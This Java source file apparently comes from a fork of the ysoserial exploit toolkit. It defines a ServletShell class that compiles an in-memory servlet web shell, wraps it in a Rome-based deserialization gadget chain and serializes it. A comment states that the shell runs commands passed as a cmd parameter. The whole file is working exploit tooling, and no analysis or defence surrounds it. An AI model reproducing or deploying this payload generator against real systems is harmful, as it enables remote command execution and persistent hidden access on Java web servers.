package ysoserial.payloads.memshell;

import ysoserial.Serializer;
import ysoserial.payloads.Eval;
import ysoserial.payloads.RomeTools;

import ysoserial.payloads.util.*;

//servlet 内存马 /1nhann?cmd=id
public class ServletShell{
    public static void main(final String[] args) throws Exception {
        Object evil = new ServletShell().getObject(RomeTools.class);
        byte[] ser = Serializer.serialize(evil);
    }

    public Object getObject(Class gadget) throws Exception {
        byte[] bytes = ReadWrite.readResource(ServletShell.class,"内存马/ServletShell.java");
        String java = new String(bytes);
        byte[] b = JavaCompiler.compile("ServletShell",java);
        Class c = ClassFiles.bytesAsClass(b);
        Object o = new Eval().getObject(gadget,c);
        return o;
    }

}
